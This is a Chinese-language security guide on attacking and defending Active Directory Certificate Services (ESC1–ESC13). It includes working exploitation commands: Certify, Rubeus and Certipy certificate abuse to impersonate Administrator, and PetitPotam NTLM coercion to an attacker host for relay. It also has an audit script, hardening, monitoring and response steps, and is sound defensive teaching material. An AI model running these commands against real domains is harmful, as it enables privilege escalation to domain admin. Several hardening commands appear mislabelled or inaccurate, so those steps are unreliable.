# Active Directory 证书服务安全

## 概述

AD CS (Active Directory Certificate Services) 是 Windows 企业 PKI 的基础设施，也是近年最危险的攻击面之一。错误配置的证书模板可以使攻击者从普通域用户直接提升到域管理员。由 SpecterOps 研究员 Will Schroeder 和 Lee Christensen 系统化研究的"Certified Pre-Owned"攻击已成为红队标配。

---

## 1. AD CS 攻击面概览

### 1.1 攻击路径图谱

```
域用户 (Domain User)
    │
    ├─→ ESC1: 错误证书模板 (SAN 可指定) → 域管理员
    ├─→ ESC2: 错误证书模板 (ANY_PURPOSE EKU)
    ├─→ ESC3: 注册代理模板滥用 → 以其他用户身份请求证书
    ├─→ ESC4: 证书模板 ACL 弱权限 → 修改模板
    ├─→ ESC5: PKI 对象 ACL 弱权限 → 控制 CA
    ├─→ ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 标志
    ├─→ ESC7: CA 角色权限 (Manage CA / Issue and Manage Certs)
    ├─→ ESC8: NTLM 中继到 AD CS HTTP 端点
    ├─→ ESC9: 无安全扩展 (CT_FLAG_NO_SECURITY_EXTENSION)
    ├─→ ESC10: 弱证书映射 (X509IssuerSubject / UPN 替代)
    ├─→ ESC11: NTLM 中继到 CA RPC 接口
    └─→ ESC13: OID 组链接滥用
```

---

## 2. 关键攻击技术

### 2.1 ESC1 - 证书模板滥用

```powershell
# 使用 Certify 枚举易受攻击的证书模板
Certify.exe find /vulnerable

# 关键特征：
# - 低权限用户可注册 (Authenticated Users)
# - Client Authentication EKU (1.3.6.1.5.5.7.3.2)
# - 无需要审批 (mspki-enrollment-flag 不包含 CT_FLAG_PEND_ALL_REQUESTS)
# - SAN 可指定 (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)

# 利用攻击
Certify.exe request /ca:CA01.domain.local\Domain-CA `
  /template:VulnerableTemplate `
  /altname:Administrator  # 请求域管理员的证书

# 使用证书获取 TGT
Rubeus.exe asktgt /user:Administrator `
  /certificate:admin.pfx `
  /password:certpass `
  /domain:domain.local `
  /dc:DC01.domain.local
```

### 2.2 ESC4 - 模板 ACL 弱权限

```powershell
# 检查当前用户对模板的控制权限
Certify.exe find

# 如果用户有 WriteProperty 权限：
# → 修改模板启用 Client Authentication EKU
# → 添加 Domain Admins 为主体
# → 修改 mspki-certificate-name-flag 允许 SAN 指定

# 攻击示例
Set-DomainObject -Identity "CN=VulnerableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" `
  -Set @{'pKIExtendedKeyUsage' = @('1.3.6.1.5.5.7.3.2')} `
  -Verbose
```

### 2.3 ESC8 - NTLM 中继到 HTTP 端点

```bash
# 攻击流程：
# 1. 强制目标机器进行 NTLM 认证 (PetitPotam / PrinterBug)
# 2. 将 NTLM 中继到 AD CS HTTP 端点 (/certsrv/)
# 3. 获取目标机器账户的证书
# 4. 使用证书进行 Kerberos 认证获取 TGT

# 使用 Certipy
python3 certipy relay \
  -ca 192.168.1.100 \
  -template DomainController \
  -target dc01.domain.local

# 强制认证
python3 PetitPotam.py \
  -u user -p password -d domain.local \
  attacker_ip dc01.domain.local
```

---

## 3. 证书攻击自动化

### 3.1 Certipy 工具

```bash
# 枚举 AD CS 环境
certipy find -u user@domain.local -p password \
  -dc-ip 192.168.1.10 \
  -vulnerable \
  -output adcs_analysis

# 请求证书
certipy req -u user@domain.local -p password \
  -ca 'CA01-DC01-CA' \
  -target ca.domain.local \
  -template VulnerableTemplate \
  -upn administrator@domain.local
  # 或 -dns DC01.domain.local (机器账户)

# 认证
certipy auth -pfx administrator.pfx \
  -domain domain.local \
  -username administrator
```

### 3.2 自定义检测脚本

```python
from ldap3 import Server, Connection, ALL
import re

class ADCSChecker:
    """AD CS 安全审计"""

    def __init__(self, domain, username, password):
        server = Server(domain, get_info=ALL)
        self.conn = Connection(server, username, password, auto_bind=True)

    def check_esc1_vulnerability(self):
        """检测 ESC1 - 错误证书模板"""
        self.conn.search(
            'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local',
            '(objectClass=pKICertificateTemplate)',
            attributes=[
                'name',
                'pKIExtendedKeyUsage',
                'msPKI-Enrollment-Flag',
                'msPKI-Certificate-Name-Flag',
                'nTSecurityDescriptor'
            ]
        )

        vulnerable = []
        for template in self.conn.entries:
            ekus = template['pKIExtendedKeyUsage'].values if template['pKIExtendedKeyUsage'] else []
            enroll_flag = int(template['msPKI-Enrollment-Flag'].value) if template['msPKI-Enrollment-Flag'] else 0
            name_flag = int(template['msPKI-Certificate-Name-Flag'].value) if template['msPKI-Certificate-Name-Flag'] else 0

            # 检查 ESC1 条件
            has_client_auth = any('1.3.6.1.5.5.7.3.2' in str(eku) for eku in ekus)
            no_approval = not (enroll_flag & 0x2)  # CT_FLAG_PEND_ALL_REQUESTS
            san_supplied = bool(name_flag & 0x1)  # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT

            if has_client_auth and no_approval and san_supplied:
                vulnerable.append({
                    'name': template['name'].value,
                    'severity': 'CRITICAL',
                    'type': 'ESC1',
                    'description': '用户可指定 SAN 并请求客户端身份验证证书'
                })

        return vulnerable

    def check_esc8_vulnerability(self):
        """检测 ESC8 - HTTP 端点中继"""
        self.conn.search(
            'CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local',
            '(objectClass=pKIEnrollmentService)',
            attributes=['name', 'dNSHostName', 'certificateTemplates']
        )

        findings = []
        for ca in self.conn.entries:
            # 检查 CA 的 HTTP 端点是否支持 NTLM
            findings.append({
                'ca': ca['name'].value,
                'hostname': ca['dNSHostName'].value if ca['dNSHostName'] else 'Unknown',
                'severity': 'HIGH',
                'type': 'ESC8',
                'description': 'AD CS HTTP端点可能被NTLM中继攻击',
                'remediation': '启用EPA (Extended Protection for Authentication)'
            })

        return findings

    def generate_report(self):
        report = {
            'esc1': self.check_esc1_vulnerability(),
            'esc8': self.check_esc8_vulnerability()
        }
        return report
```

---

## 4. 防御加固

### 4.1 证书模板加固

```yaml
证书模板安全基线:
  审批要求:
    - 所有认证类模板必须 CA 证书管理员审批
    - 启用 CT_FLAG_PEND_ALL_REQUESTS

  SAN 限制:
    - 禁止 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
    - 从 AD 自动构建主体名称
    - 高价值模板使用 caVersion >= 4 + 安全扩展

  EKU 限制:
    - 严格区分签名/加密/认证用途
    - 不包含 Any Purpose (2.5.29.37.0)
    - 不包含 SubCA (1.3.6.1.5.5.7.3.22)

  ACL 加固:
    - 仅 Domain Admins 可修改模板
    - 移除 Authenticated Users 注册权限
    - 使用专用安全组授权
```

### 4.2 CA 服务器加固

```powershell
# 禁用 NTLM 认证 (优先 Kerberos)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
  -Name "LmCompatibilityLevel" -Value 5 `
  -Type DWord

# 启用 EPA (Extended Protection for Authentication)
certutil -setreg CA\InterfaceFlags +IF_ENFORCE_ENCRYPT_CERT_REQUEST

# 启用 EPA on IIS
Set-WebConfigurationProperty `
  -Filter "system.webServer/security/authentication/windowsAuthentication" `
  -Name "extendedProtection.tokenChecking" `
  -Value "Require"

# 限制证书注册代理
$restricted_agents = @("Restricted Agent Group")
# 配置模板保护: caVersion=4
certutil -setreg policy\EditFlags +EDITF_ENABLEFORCERESTRICTEDRA
```

### 4.3 监控检测

```yaml
AD CS 安全监控:
  事件 ID:
    - 4886: 证书服务收到证书请求
    - 4887: 证书服务批准了证书请求
    - 4898: 证书服务加载了模板

  高危信号:
    - 非业务时间的大量证书请求
    - 同一用户在短时间内请求多个证书
    - 证书模板从非 CA 账户修改
    - SAN 值与 AD 对象名不匹配
    - 从非域控 IP 发起 DCSync 风格请求

  Sentinel/Humio 查询:
    EventID=4886
    | where CertificateTemplate in ("VulnerableTemplate1", "VulnerableTemplate2")
    | where SubjectName != ""
    | project TimeGenerated, Requester, CertificateTemplate, SubjectName
```

---

## 5. 应急响应

### 场景：检测到 ESC1 利用

```powershell
# 1. 立即吊销被盗证书
certutil -revoke <SerialNumber> 1

# 2. 发布 CRL
certutil -CRL

# 3. 识别受影响的证书模板
Get-CATemplate -Name "*" | Where-Object {
    $_.ConfigString -like "*Vulnerable*"
}

# 4. 修复模板 (移除 SAN 自定义)
$template = Get-CATemplate -Name "VulnerableTemplate"
$template.EnrollmentFlags = $template.EnrollmentFlags -bor 0x2  # 添加审批
$template.SubjectNameFlags = $template.SubjectNameFlags -band -bnot 0x1  # 移除自定义 SAN
Set-CATemplate -InputObject $template

# 5. 检查所有已颁发的证书
certutil -view -restrict "CertificateTemplate=VulnerableTemplate" `
  -out "RequestID,RequesterName,SerialNumber,NotBefore,NotAfter"

# 6. 重置 krbtgt 密码 (如果 Domain Admin 可能被攻破)
Reset-ADAccountPassword -Identity krbtgt -ResetPasswordOnNextLogon $false
```

---

## 参考资源

- [Certified Pre-Owned (SpecterOps)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Certipy](https://github.com/ly4k/Certipy)
- [Certify](https://github.com/GhostPack/Certify)
- [AD CS Abuse (harmj0y)](https://www.harmj0y.net/blog/activedirectory/the-certificate-usage-is-changing/)

---

*上一篇：[Windows 数字取证](./03-windows-forensics.md)*

*下一篇：[Windows 取证深度](06-windows-forensics.md)*
